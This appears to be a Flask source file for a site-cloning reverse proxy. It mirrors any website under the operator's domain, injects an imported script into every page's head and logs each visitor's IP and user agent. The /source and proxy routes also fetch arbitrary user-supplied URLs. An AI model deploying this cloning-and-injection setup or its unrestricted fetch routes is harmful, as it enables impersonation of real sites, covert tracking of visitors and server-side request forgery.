from flask import Flask, request, Response
import requests
from helper import headers, js_code, server_url, modify_links, pretty
from database import log
from datetime import datetime
import pytz

app = Flask(__name__)

user_site = [entry["url"] for entry in log.find()][-1]

# Create a session and set headers
session = requests.Session()
session.headers.update(headers)

@app.route('/clone', methods=['GET', 'POST'])
def clone_site():
    global user_site
    if request.method == 'POST':
        site = request.form.get('site', '')
        if site.startswith('www'):
            site = 'https://' + site
        user_site = site.rstrip('/')
        
        # Log the visited URL to MongoDB
        log.insert_one({
            "url": user_site,
            "ip": request.headers.get('X-Forwarded-For', request.remote_addr),
            "user": request.headers.get('User-Agent', 'N/A'), 
            "time": datetime.now(pytz.timezone("Asia/Kolkata")).strftime("%Y-%m-%d %H:%M:%S")
        })
        
        return f"User site set to: {user_site}<br><br><a href='/'>Return"

    # Fetch visited URLs from MongoDB
    visited_urls = [entry["url"] for entry in log.find()]


    log.insert_one({
        "url": 'visited /clone',
        "ip": request.headers.get('X-Forwarded-For', request.remote_addr),
        "user": request.headers.get('User-Agent', 'N/A'), 
        "time": datetime.now(pytz.timezone("Asia/Kolkata")).strftime("%Y-%m-%d %H:%M:%S")
    })
    
    # Display visited URLs in the GET part
    visited_urls_str = '<br>'.join(visited_urls) if visited_urls else 'No visited URLs yet.'
    return f"""
Currently cloning: {user_site}

<form method='post'>
    <label for='site'>Enter Website URL:</label>
    <input type='text' id='site' name='site' value='https://'>
    <input type='submit' value='Clone'>
</form>
<br><br>
Visited URLs:
<br>
{visited_urls_str}
"""

def fetch_and_modify_content(url):
    full_url = user_site + '/' + url
    user_sitename = user_site.replace('https://','')
    try:
        response = session.get(full_url)
        content_type = response.headers['Content-Type']

        if content_type.startswith(('text', 'application')):
            html_content = response.content.replace(user_sitename.encode('utf-8'), server_url.encode('utf-8'))
            html_content = html_content.replace(b'</head>', js_code.encode('utf-8') + b'</head>', 1)
            return html_content, content_type
            
        return response.content, content_type
    except Exception as e:
        return str(e), 'text/plain'

@app.route('/source/<path:url>')
def source(url):
    try:
        response = session.get(url)
        
        formatted_html = f'<pre>{pretty(response.content)}</pre>'

        return Response(formatted_html, content_type='text/plain')
    except Exception as e:
        return str(e)

@app.route('/<path:url>')
def proxy(url):
    if 'http' not in url:
        modified_content, content_type = fetch_and_modify_content(url)
        return Response(modified_content, content_type=content_type)
    else:
        response = session.get(url)
        content_type = response.headers['Content-Type']
        modified_content = modify_links(url, response.content)
        return Response(modified_content, content_type=content_type)
            

@app.route('/')
def site():
    log.insert_one({
        "url": 'visited / of site - ' + str(request.url),
        "ip": request.headers.get('X-Forwarded-For', request.remote_addr),
        "user": request.headers.get('User-Agent', 'N/A'), 
        "time": datetime.now(pytz.timezone("Asia/Kolkata")).strftime("%Y-%m-%d %H:%M:%S")
    })
    modified_content, content_type = fetch_and_modify_content('')
    return Response(modified_content, content_type=content_type)

if __name__ == '__main__':
    app.run(debug=True)
